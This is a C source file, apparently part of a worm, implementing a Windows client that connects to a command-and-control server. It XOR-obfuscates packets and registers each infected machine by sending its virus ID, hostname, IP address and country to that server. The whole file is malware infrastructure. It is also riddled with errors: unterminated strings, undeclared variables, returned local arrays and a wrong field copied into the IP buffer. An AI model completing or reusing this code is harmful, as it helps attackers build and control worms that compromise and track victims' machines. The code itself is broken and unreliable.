#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <cstring>
#include <string.h>
#include "networking.h"

#define DEFAULT_BUFLEN 512

#pragma comment(lib, "Ws2_32.lib")


/* Function: Function to create socket and connection with the C2 server  
*  Input: the hostname and port of the C2 server
*  Output: Handle for connection
*/
SOCKET connect_to_c2(char *hostname, int port){
	
	/* Initialize Winsock */
	WSADATA wsaData;

	/* Initialize WSA */
	int iResult;
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if(iResult != 0){
		printf("WSA Startup failed: %d\n", iResult);
		return 1;
	}

	/* Initialize Socket */
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	/* Resolve Server Address & Port */
	iResult = getaddrinfo(hostname, port, &hints, &result);
	if(iResult != 0){
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	/* Create Socket Object */
	SOCKET ConnectSocket = INVALID_SOCKET;
	ptr = result;

	/* Socket Error Check */
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if(ConnectSocket == INVALID_SOCKET){
		printf("Error at socket9): %;d\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	/* Connect to a Socket */
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if(iResult == SOCKET_ERROR){
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	/* Connection Error Check */
	freeaddrinfo(result);
	if(ConnectSocket == INVALID_SOCKET){
		printf("Unable to connect to server!\n:);
		WSACleanup();
		return 1;
	}

	return ConnectSocket;
}

/* Function: Send a Constructed Message to the C2 server and receive the response data 
*  Input: Encrypted Packet Buffer
*  Output: Response Packet
*/
		       
char *send_to_c2(char *encrypted_data){
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;

	iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
	if(iResult == SOCKET_ERROR){
		printf("send failed: %d\n, WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	iResult = shutdown(ConnectSocket, SD_SEND);
	
	/* Disconnect from C2 */
	if(iResult == SOCKET_ERROR){
		printf("shutdown failed: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	/* Receive Data */
	do {
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if(iResult > 0){
			printf("Bytes received: %d\n", iResult);
		}else if(iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed: %d\n", WSAGetLastError());
	} while(iResult > 0);

	return recvbuf;
}

/* Function: Encrypts a Data packet from plaintext buffer 
*  Input: Encrypted Packet Buffer
*  Output: Response Packet
*/

char *encryption(char *decrypted_data){
	int i;
	char encrypted_data[DEFAULT_BUFLEN];

	/* Extract XOR key */
	XOR_key = decrypted_data[0];
	
	/* Apply XOR key to rest of the buffer */
	for(i=1; i < strlen(decrypted_data); ++i){
		encrypted_data[i] = decrypted_data[i] ^ XOR_key;
	}

	return encrypted_data;
}

/* Function: Decrypts a Data packet 
*  Input: Encrypted Packet Buffer
*  Output: Decrypted Packet
*/
		       
char *decryption(char *encrypted_data){
	int i;
	char decrypted_data[DEFAULT_BUFLEN];

	/* Extract XOR key */
	XOR_key = encrypted_data[0];

	/* Apply XOR key to rest of the buffer */
	for(i=1; i < strlen(encrypted_data); ++i){
		decrypted_data[i] = encrypted_data[i] ^ XOR_key;
	}

	return decrypted_data;
}

/* Function: Takes variable length inputs and ensures that the init packet is the correct format (See Google Drive for specific details) 
*  Input: Variables to be inserted into the server database
*  Output: A single combined packet in the correct format
*/

char *structure_init_message(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
	char buffer[32];

	/* Allocate buffers */
	char *virus_id_10 = (char *)malloc(sizeof(CHAR)*10);
	char *hostname_10 = (char *)malloc(sizeof(CHAR)*10);
	char *ip_10 = (char *)malloc(sizeof(CHAR)*10);
	char *country_2 = (char *)malloc(sizeof(CHAR)*2);

	/* Set buffer to Nulls */
	memset(virus_id_10, '\0', sizeof(virus_id_10));
	memset(hostname_10, '\0', sizeof(hostname_10));
	memset(ip_10, '\0', sizeof(ip_10));
	memset(country_2, '\0', sizeof(country_2));

	/* Copy variables into their correct sizes */
	strncpy(virus_id_10, virus_id, 10);
	strncpy(hostname_10, hostname, 10);
	strncpy(ip_10, virus_id, 10);
	strncpy(country_2, country, 2);

	/* Create Message Buffer */
	buffer[0] = XOR_key;
	buffer = strcat(buffer, virus_id);
	buffer = strcat(buffer, hostname);
	buffer = strcat(buffer, ip);
	buffer = strcat(buffer, country);

	return buffer;
}

/* Function: Main Driver function for the first contact with server, utlizies previously defined functions 
*  Input: Variables to be sent to the database
*  Output: Server verification
*/

int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
	char *message = structure_init_message(XOR_key, virus_id, hostname, ip, country);
	char *encrypted_message = encryption(message);
	int result = send_to_c2(encrypted_message);
	return result;
}
